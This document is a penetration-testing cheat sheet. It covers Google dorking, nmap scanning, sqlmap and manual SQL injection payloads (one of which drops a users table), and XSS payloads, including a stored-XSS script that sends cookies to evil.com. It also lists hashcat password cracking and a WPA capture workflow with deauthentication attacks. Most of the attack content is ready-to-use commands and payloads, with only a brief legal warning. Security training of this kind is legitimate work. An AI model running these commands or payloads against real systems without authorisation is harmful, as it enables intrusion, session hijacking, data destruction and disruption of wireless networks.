Reconnaissance (Information Gathering)

Information gathering is the first and most critical phase of penetration testing. The quality and quantity of information collected directly impacts the success of subsequent phases.

Passive Reconnaissance

Passive reconnaissance involves gathering information without directly interacting with the target's systems. This method is stealthier and harder to detect.

OSINT Framework

Open Source Intelligence gathering techniques and tools:

  • Google Dorking - Advanced search operators
  • WHOIS Lookup - Domain registration info
  • DNS Enumeration - DNS records discovery
  • Social Media - Employee information
  • Public Records - Business filings
Google Dorking Operators
site:target.com Pages on specific domain
inurl:admin URLs containing "admin"
filetype:pdf Specific file types
intitle:"index of" Directory listings
cache:target.com Cached versions
link:target.com Sites linking to target

Active Reconnaissance

Active reconnaissance involves direct interaction with the target's systems. While more informative, it's also more likely to be detected by security systems.

Network Scanning & Enumeration

Network scanning identifies live hosts, open ports, running services, and potential vulnerabilities. This phase bridges reconnaissance and exploitation.

Nmap - The Network Mapper

Nmap is the industry-standard network scanning tool, capable of host discovery, port scanning, service enumeration, and OS detection.

# Basic TCP Scan
nmap -sS target.com                    # SYN Scan (Stealth)
nmap -sT target.com                    # TCP Connect Scan
nmap -sU target.com                    # UDP Scan

# Service & Version Detection
nmap -sV target.com                    # Version Detection
nmap -sV --version-intensity 5 target  # Intensity 0-9

# OS Detection
nmap -O target.com                     # OS Fingerprinting
nmap -O --osscan-guess target.com      # Aggressive guessing

# Comprehensive Scans
nmap -A target.com                     # Aggressive scan (OS, version, scripts, traceroute)
nmap -sC -sV -O target.com            # Default scripts + version + OS

# Network Discovery
nmap -sn 192.168.1.0/24               # Ping sweep (no port scan)
nmap -sP 192.168.1.0/24               # Host discovery

# NSE Scripts
nmap --script vuln target.com         # Vulnerability scripts
nmap --script auth target.com         # Authentication scripts
nmap --script brute target.com        # Brute force scripts
nmap --script "http-*" target.com     # All HTTP scripts

# Output Formats
nmap -oN output.txt target.com        # Normal output
nmap -oX output.xml target.com        # XML output
nmap -oA output target.com            # All formats

SQL Injection

SQL injection remains one of the most critical web vulnerabilities. Understanding different injection techniques is essential for any penetration tester.

# SQLMap - Automated SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" -p user

# With cookie
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"

# SQLMap tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Manual SQL Injection payloads
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--

Cross-Site Scripting (XSS)

Reflected XSS

Malicious script is reflected off the web server in error messages, search results, or any response that includes user input.

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
Stored XSS

Malicious script is permanently stored on the target server (database, forum posts, comments).

<script>
document.location='http://evil.com/steal?c='+document.cookie
</script>
DOM-Based XSS

Attack payload is executed by modifying the DOM environment in the victim's browser.

#<script>alert('XSS')</script>
javascript:alert('XSS')

Exploitation Techniques

Exploitation is the phase where identified vulnerabilities are leveraged to gain unauthorized access or escalate privileges. This requires careful planning and execution.

Legal Warning: Exploitation techniques should ONLY be used on systems you have explicit written permission to test. Unauthorized access to computer systems is illegal under laws such as the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.

Hashcat - GPU Password Cracking

# Basic syntax
hashcat -m [mode] -a [attack] hash.txt wordlist.txt

# Attack modes
# -a 0: Dictionary attack
# -a 1: Combination attack
# -a 3: Brute force attack
# -a 6: Hybrid (wordlist + mask)
# -a 7: Hybrid (mask + wordlist)

# Dictionary attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Brute force (mask attack)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special, ?a = all

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Show cracked passwords
hashcat -m 0 hashes.txt --show

# Benchmark
hashcat -b

# 1. Discovery
airodump-ng wlan0mon                    # Scan all networks

# 2. Target Selection & Capture
airodump-ng -c [channel] --bssid [target] -w capture wlan0mon

# 3. Client Deauthentication (to force reconnection)
aireplay-ng -0 5 -a [AP_BSSID] wlan0mon           # Broadcast deauth
aireplay-ng -0 5 -a [AP_BSSID] -c [CLIENT_MAC] wlan0mon  # Targeted

# 4. Handshake Verification
aircrack-ng capture-01.cap | grep "handshake"

# 5. Offline Cracking
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture-01.cap

hcxpcapngtool -o hash.hc22000 capture-01.cap
